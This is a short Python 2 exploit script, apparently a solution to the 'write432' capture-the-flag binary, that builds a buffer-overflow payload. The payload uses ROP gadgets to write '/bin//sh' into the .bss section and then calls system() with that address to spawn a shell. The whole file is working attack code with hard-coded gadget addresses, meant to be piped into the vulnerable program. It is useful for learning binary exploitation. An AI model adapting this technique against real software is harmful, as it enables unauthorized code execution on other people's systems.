#!/usr/bin/python
from struct import pack
import re
# ==================================================
# Usages:  (python exp.py; cat) | ./binaryName
# =================================================

#+ ------------------------------------------------------------------ +
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |     _____ ___________   _____                                  | =
#= |    /  ___/  ___| ___ \ |  __ \                                 | =
#= |    \ `--.\ `--.| |_/ / | |  \/_ __ ___  _   _ _ __             | =
#= |     `--. \`--. \ ___ \ | | __| '__/ _ \| | | | '_ \            | =
#= |    /\__/ /\__/ / |_/ / | |_\ \ | | (_) | |_| | |_) |           | =
#= |    \____/\____/\____/   \____/_|  \___/ \__,_| .__/            | =
#= |                                              | |               | =
#= |                                              |_|               | =
#= +----------------------------------------------------------------+ =
#= +----------------------------------------------------------------+ =
#= |                                                                | =
#= |                   surajsinghbisht054@gmail.com                 | =
#= |                      www.bitforestinfo.com                     | =
#= |                                                                | =
#= |                  Try Smart, Try Hard & Don't Cheat             | =
#= +----------------------------------------------------------------+ =
#+ ------------------------------------------------------------------ +

# Try (python exp.py; cat) | ./write432 


pattern = '''AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmABnABoABpABqABrABsABtABuABvABwABxAByABzAB1AB2AB3AB4AB5AB6AB7AB8AB9AB0ACBACCACDACEACFACGACHACIACJACKACL'''

# Useful Gadgets
g1 = 0x08048670 # mov dword ptr [edi], ebp ; ret
g2 = 0x080483e1 # pop ebx ; ret
g3 = 0x080486db # pop ebp ; ret
g4 = 0x080486da # pop edi ; pop ebp ; ret


# Useful Address
ad1 = 0x0804864c # useful function
ad2 = 0x080485f6 # pwnme
ad3 = 0x0804a040 #.bss
ad4 = 0x08048430 # system
# Writing Codes 
def gen_args(s, adr):
	a = adr
	payload = ''
	for i in re.findall('....', s):
		payload += pack('I', g4) # pop
		payload += pack('I', a) # EDI
		payload += i # Ebp
		payload += pack('I', g1) # mov [edi] ebp
		a += 4

	return payload


# Payload Section
# Little endian: 44

# Buffer
payload = ''
payload += 'A'*36	 # Pointed By EAX, ECX,
payload += 'BBBB'
payload += 'CCCC' 	# EBP

# Controls
payload += gen_args('/bin//sh   ', ad3) # EIP
payload += pack('I', ad4) # system
payload += 'AAAA' # Next Command
payload += pack('I', ad3) # Argument
print payload

